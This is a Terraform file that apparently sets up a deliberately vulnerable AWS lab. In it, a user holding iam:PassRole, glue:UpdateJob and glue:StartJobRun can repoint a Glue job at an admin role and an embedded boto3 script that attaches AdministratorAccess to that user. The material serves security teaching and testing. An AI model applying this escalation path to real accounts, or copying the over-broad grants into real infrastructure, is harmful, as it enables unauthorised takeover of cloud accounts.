# iam-passrole+glue-updatejob+glue-startjobrun privilege escalation scenario
#
# This scenario demonstrates how a user with iam:PassRole, glue:UpdateJob, and glue:StartJobRun
# can update an existing Glue Job to use a privileged role and malicious script, then execute it
# to grant the starting user admin access.

# Resource naming convention: pl-prod-glue-005-to-admin-{resource-type}
# Provider: aws.prod

# Scenario-specific starting user
resource "aws_iam_user" "starting_user" {
  provider = aws.prod
  name     = "pl-prod-glue-005-to-admin-starting-user"

  tags = {
    Name        = "pl-prod-glue-005-to-admin-starting-user"
    Environment = var.environment
    Scenario    = "iam-passrole+glue-updatejob+glue-startjobrun"
    Purpose     = "starting-user"
  }
}

# Create access keys for the starting user
resource "aws_iam_access_key" "starting_user_key" {
  provider = aws.prod
  user     = aws_iam_user.starting_user.name
}

# S3 bucket for Glue job scripts
resource "aws_s3_bucket" "script_bucket" {
  provider = aws.prod
  bucket   = "pl-glue-scripts-glue-005-${var.account_id}-${var.resource_suffix}"

  tags = {
    Name        = "pl-glue-scripts-glue-005-${var.account_id}-${var.resource_suffix}"
    Environment = var.environment
    Scenario    = "iam-passrole+glue-updatejob+glue-startjobrun"
    Purpose     = "glue-job-scripts"
  }
}

# Block public access to the script bucket
resource "aws_s3_bucket_public_access_block" "script_bucket_pab" {
  provider = aws.prod
  bucket   = aws_s3_bucket.script_bucket.id

  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

# Upload the benign script to S3
resource "aws_s3_object" "benign_script" {
  provider = aws.prod
  bucket   = aws_s3_bucket.script_bucket.id
  key      = "benign_script.py"
  content  = <<-EOT
# Benign Glue job script
print('Benign job execution complete')
EOT

  tags = {
    Name        = "benign-script"
    Environment = var.environment
    Scenario    = "iam-passrole+glue-updatejob+glue-startjobrun"
    Purpose     = "benign-script"
  }
}

# Upload the malicious script to S3
resource "aws_s3_object" "malicious_script" {
  provider = aws.prod
  bucket   = aws_s3_bucket.script_bucket.id
  key      = "escalation_script.py"
  content  = <<-EOT
import boto3

# This script grants admin access to the starting user
iam = boto3.client('iam')

try:
    iam.attach_user_policy(
        UserName='${aws_iam_user.starting_user.name}',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    print("Successfully attached AdministratorAccess to ${aws_iam_user.starting_user.name}")
except Exception as e:
    print(f"Error: {e}")
EOT

  tags = {
    Name        = "escalation-script"
    Environment = var.environment
    Scenario    = "iam-passrole+glue-updatejob+glue-startjobrun"
    Purpose     = "attack-script"
  }
}

# Bucket policy granting read access to all principals in the account
resource "aws_s3_bucket_policy" "script_bucket_policy" {
  provider = aws.prod
  bucket   = aws_s3_bucket.script_bucket.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "AllowAccountReadGetObject"
        Effect = "Allow"
        Principal = {
          AWS = "arn:aws:iam::${var.account_id}:root"
        }
        Action = [
          "s3:GetObject"
        ]
        Resource = "${aws_s3_bucket.script_bucket.arn}/*"
      }
    ]
  })
}

# Initial non-privileged role (used by the pre-created Glue job)
resource "aws_iam_role" "initial_role" {
  provider = aws.prod
  name     = "pl-prod-glue-005-to-admin-initial-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          Service = "glue.amazonaws.com"
        }
        Action = "sts:AssumeRole"
      }
    ]
  })

  tags = {
    Name        = "pl-prod-glue-005-to-admin-initial-role"
    Environment = var.environment
    Scenario    = "iam-passrole+glue-updatejob+glue-startjobrun"
    Purpose     = "initial-role"
  }
}

# Attach AWS Glue Service Role to the initial role
resource "aws_iam_role_policy_attachment" "initial_role_glue_service" {
  provider   = aws.prod
  role       = aws_iam_role.initial_role.name
  policy_arn = "arn:aws:iam::aws:policy/service-role/AWSGlueServiceRole"
}

# Target admin role (will be passed to Glue Job during update)
resource "aws_iam_role" "target_role" {
  provider = aws.prod
  name     = "pl-prod-glue-005-to-admin-target-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          Service = "glue.amazonaws.com"
        }
        Action = "sts:AssumeRole"
      }
    ]
  })

  tags = {
    Name        = "pl-prod-glue-005-to-admin-target-role"
    Environment = var.environment
    Scenario    = "iam-passrole+glue-updatejob+glue-startjobrun"
    Purpose     = "admin-target"
  }
}

# Attach AdministratorAccess to the target role
resource "aws_iam_role_policy_attachment" "target_role_admin_access" {
  provider   = aws.prod
  role       = aws_iam_role.target_role.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}

# Attach AWS Glue Service Role for Glue operations
resource "aws_iam_role_policy_attachment" "target_role_glue_service" {
  provider   = aws.prod
  role       = aws_iam_role.target_role.name
  policy_arn = "arn:aws:iam::aws:policy/service-role/AWSGlueServiceRole"
}

# Pre-create the Glue job with initial role and benign script
resource "aws_glue_job" "initial_job" {
  provider = aws.prod
  name     = "pl-glue-005-to-admin-job"
  role_arn = aws_iam_role.initial_role.arn

  command {
    name            = "pythonshell"
    script_location = "s3://${aws_s3_bucket.script_bucket.id}/${aws_s3_object.benign_script.key}"
    python_version  = "3.9"
  }

  max_capacity = 0.0625
  timeout      = 5

  tags = {
    Name        = "pl-glue-005-to-admin-job"
    Environment = var.environment
    Scenario    = "iam-passrole+glue-updatejob+glue-startjobrun"
    Purpose     = "glue-job"
  }

  # This job is created with the initial non-privileged role
  # The attacker will update it to use the target admin role
}

# Policy for the starting user with required permissions
resource "aws_iam_user_policy" "starting_user_policy" {
  provider = aws.prod
  name     = "pl-prod-glue-005-to-admin-starting-user-policy"
  user     = aws_iam_user.starting_user.name

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "RequiredForExploitationPassRole"
        Effect = "Allow"
        Action = [
          "iam:PassRole"
        ]
        Resource = aws_iam_role.target_role.arn
      },
      {
        Sid    = "RequiredForExploitationGlue"
        Effect = "Allow"
        Action = [
          "glue:UpdateJob",
          "glue:StartJobRun"
        ]
        Resource = "*"
      },
      {
        Sid    = "HelpfulForDemoScript"
        Effect = "Allow"
        Action = [
          "glue:GetJob",
          "glue:GetJobRun",
          "glue:GetJobRuns",
          "sts:GetCallerIdentity"
        ]
        Resource = "*"
      }
    ]
  })
}
